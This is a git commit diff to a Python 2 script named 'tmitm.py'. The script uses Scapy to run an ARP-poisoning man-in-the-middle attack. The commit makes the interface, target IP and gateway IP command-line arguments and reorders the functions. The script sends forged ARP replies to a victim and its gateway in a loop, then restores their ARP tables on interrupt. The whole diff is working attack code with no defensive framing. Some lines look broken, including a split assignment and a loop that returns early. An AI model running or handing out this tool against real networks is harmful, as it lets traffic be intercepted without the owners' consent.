4fef998d940cdfbe834d173b0168685423ffa0a8
koppfabi <koppfabi@tu-cottbus.de>
2017-11-23 23:06:58 +0100

    init

--- tmitm.py
+++ tmitm.py
@@ -5,15 +5,66 @@ import threading
 import signal
 
 
-interface = "en1"
+interface = sys.argv[1]
 conf.iface = interface
-target_ip = "10.10.10.100"
-gateway_ip = "10.10.10.102"
+target_ip = sys.argv[2]
+gateway_ip = sys.argv[3]
 packet_count = 1000
 
 
+def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
+    # slightly different method using send
+    print "[*] Restoring target..."
+    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,
+    hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
+    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
+    hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
+    # signals the main thread to exit
+    os.kill(os.getpid(), signal.SIGINT)
+
+
+def get_mac(IP):
+    ans, unans = arping(IP)
+    for _, r in ans:
+        return r[Ether].src
+
+
+def get_mac_(ip_address):
+    responses,unanswered =
+    srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),
+    timeout=2,retry=10)
+    # return the MAC address from a response
+    for s,r in responses:
+        return r[Ether].src
+    
+    return None
+def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
+
+    poison_target = ARP()
+    poison_target.op = 2
+    poison_target.psrc = gateway_ip
+    poison_target.pdst = target_ip
+    poison_target.hwdst= target_mac
+    poison_gateway = ARP()
+    poison_gateway.op = 2
+    poison_gateway.psrc = target_ip
+    poison_gateway.pdst = gateway_ip
+    poison_gateway.hwdst= gateway_mac
+    print "[*] Beginning the ARP poison. [CTRL-C to stop]"
+    while True:
+        try:
+            send(poison_target)
+            send(poison_gateway)
+            time.sleep(2)
+        except KeyboardInterrupt:
+            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
+
+        print "[*] ARP poison attack finished."
+        return
+
+
 # turn off output
-conf.verb = 0
+conf.verb = 1
 print "[*] Setting up %s" % interface
 gateway_mac = get_mac(gateway_ip)
 if gateway_mac is None:
@@ -52,54 +103,3 @@ else:
 
 
 
-def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
-    # slightly different method using send
-    print "[*] Restoring target..."
-    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,
-    hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
-    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
-    hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
-    # signals the main thread to exit
-
-os.kill(os.getpid(), signal.SIGINT)
-
-
-def get_mac(IP):
-    ans, unans = arping(IP)
-    for s, r in ans:
-        return r[Ether].src
-
-
-def get_mac_(ip_address):
-    responses,unanswered =
-    srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),
-    timeout=2,retry=10)
-    # return the MAC address from a response
-    for s,r in responses:
-        return r[Ether].src
-    
-    return None
-def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
-
-    poison_target = ARP()
-    poison_target.op = 2
-    poison_target.psrc = gateway_ip
-    poison_target.pdst = target_ip
-    poison_target.hwdst= target_mac
-    poison_gateway = ARP()
-    poison_gateway.op = 2
-    poison_gateway.psrc = target_ip
-    poison_gateway.pdst = gateway_ip
-    poison_gateway.hwdst= gateway_mac
-    print "[*] Beginning the ARP poison. [CTRL-C to stop]"
-    while True:
-
-    try:
-        send(poison_target)
-        send(poison_gateway)
-        time.sleep(2)
-    except KeyboardInterrupt:
-        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
-
-    print "[*] ARP poison attack finished."
-    return
